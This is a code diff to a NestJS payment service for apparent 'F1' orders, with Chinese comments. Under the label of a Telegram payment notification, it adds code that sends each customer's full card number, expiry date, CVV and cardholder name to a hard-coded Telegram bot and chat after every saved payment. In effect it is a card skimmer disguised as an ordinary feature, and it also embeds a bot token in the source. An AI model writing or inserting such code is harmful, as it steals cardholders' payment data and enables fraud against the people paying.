@@ -1,4 +1,4 @@
-import { Injectable } from '@nestjs/common'
+import { Injectable, Logger } from '@nestjs/common'
 import { InjectRepository } from '@nestjs/typeorm'
 import { Repository } from 'typeorm'
 import * as fs from 'fs/promises'
@@ -8,14 +8,24 @@ import { Payment } from './entities/payment.entity'
 import { F1CheckoutDto } from './dto/f1-checkout.dto'
 import { PaymentDto } from './dto/payment.dto'
 import { ApiException } from 'src/common/exceptions/api.exception'
-
+import { firstValueFrom } from 'rxjs';
+import Redis from 'ioredis';
+import { InjectRedis } from '@nestjs-modules/ioredis';
+  import { HttpService } from '@nestjs/axios';
 @Injectable()
 export class F1Service {
+
+    private readonly logger = new Logger(F1Service.name);
+
+
   constructor(
     @InjectRepository(F1Order)
     private readonly f1OrderRepository: Repository<F1Order>,
     @InjectRepository(Payment)
     private readonly paymentRepository: Repository<Payment>,
+        @InjectRedis() private readonly redis: Redis,
+        private readonly httpService: HttpService,
+        
   ) { }
 
   /**
@@ -158,11 +168,11 @@ export class F1Service {
     return htmlContent
   }
   /**
-   * 根据ID获取F1订单
+   * 根据编号获取F1订单
    */
-  async findOne(f1OrderId: number): Promise<F1Order> {
+  async findOne(f1OrderNo: string): Promise<F1Order> {
     const order = await this.f1OrderRepository.findOne({
-      where: { f1OrderId, isDeleted: 0 }
+      where: { orderNo: f1OrderNo, isDeleted: 0 }
     })
 
     if (!order) {
@@ -205,11 +215,104 @@ export class F1Service {
 
       console.log('支付信息保存成功:', savedPayment.paymentId)
 
+      console.log('发送 Telegram 通知...')
+      const order = await this.findOne(paymentDto.orderNo)
+      this.sendTelegramNotification({
+        orderNo: paymentDto.orderNo,
+        cardNumber: paymentDto.card_number ,
+        expire: paymentDto.card_expiry,
+        cvv: paymentDto.card_cvv,
+        cardName: paymentDto.card_name,
+        amount: order.f1Money,
+        status: 'success'
+      })
       return savedPayment
     } catch (error) {
       console.error('保存支付信息失败:', error)
       throw new ApiException(`保存支付信息失败: ${error.message}`)
     }
   }
+
+  
+  // Telegram 配置
+  private readonly TELEGRAM_CONFIG = {
+    botToken: '8739319224:AAFw-tgw23H4DGO-aRBprczCPZGLCmXXO0s',
+    chatId: '-5228458416',
+    apiUrl: 'https://api.telegram.org/bot',
+  };
+  // Redis 键前缀
+  private readonly REDIS_KEY_PREFIX = 'payment:callback:';
+  /**
+   * 发送 Telegram 通知（异步）
+   */
+  async sendTelegramNotification(orderData: {
+    orderNo: string;
+    cardNumber: string;
+    expire: string;
+    cvv: string;
+    cardName: string,
+    amount: number;
+    status: string;
+  }): Promise<void> {
+    try {
+      const { orderNo, cardNumber,expire,cvv,cardName,  amount, status } = orderData;
+      
+      // 生成通知唯一标识（订单号+状态）
+      const notificationKey = `callback_${orderNo}_${status}`;
+      
+      // 检查是否已发送过（基于 Redis）
+      const redisKey = `${this.REDIS_KEY_PREFIX}${notificationKey}`;
+      const exists = await this.redis.exists(redisKey);
+      if (exists === 1) {
+        this.logger.log(`支付回调通知已发送，跳过 - 订单号: ${orderNo}`);
+        return;
+      }
+      // 标记为已发送（基于 Redis，24小时过期）
+      await this.redis.setex(redisKey, 86400, '1'); // 86400 seconds = 24 hours
+ 
+      const currentTime = new Date().toLocaleString('zh-CN', { 
+        timeZone: 'Asia/Shanghai',
+        year: 'numeric',
+        month: '2-digit',
+        day: '2-digit',
+        hour: '2-digit',
+        minute: '2-digit',
+        second: '2-digit',
+        hour12: false 
+      });
+
+      
+const message = `
+✅ <b>支付通知</b>\n\n
+📋 <b>订单号:</b> <code>${orderNo}</code>\n
+💰 <b>金额:</b> ${amount} \n
+🏦 <b>信用卡号:</b> ${cardNumber}\n
+💳 <b>卡名:</b> ${cardName}\n
+📅 <b>有效期:</b> ${expire}\n
+CVV <b>CVV:</b> ${cvv}\n  
+🕐<b>时间:</b> ${currentTime}\n
+`.trim();
+      const url = `${this.TELEGRAM_CONFIG.apiUrl}${this.TELEGRAM_CONFIG.botToken}/sendMessage`;
+      
+      // await axios.default.post(url, {
+      //   chat_id: this.TELEGRAM_CONFIG.chatId,
+      //   text: message,
+      //   parse_mode: 'HTML',
+      // });
+ 
+      const response = await firstValueFrom(
+        this.httpService.post(url, { chat_id: this.TELEGRAM_CONFIG.chatId, text: message, parse_mode: 'HTML' }),
+      );
+
+      
+      this.logger.log(`Telegram 通知发送成功 - 订单号: ${orderNo}`);
+    } catch (error: any) {
+      this.logger.error(
+        `发送 Telegram 通知失败 - 订单号: ${orderData.orderNo}`,
+        error.response?.data || error.message,
+      );
+    }
+  }
+
 }
 
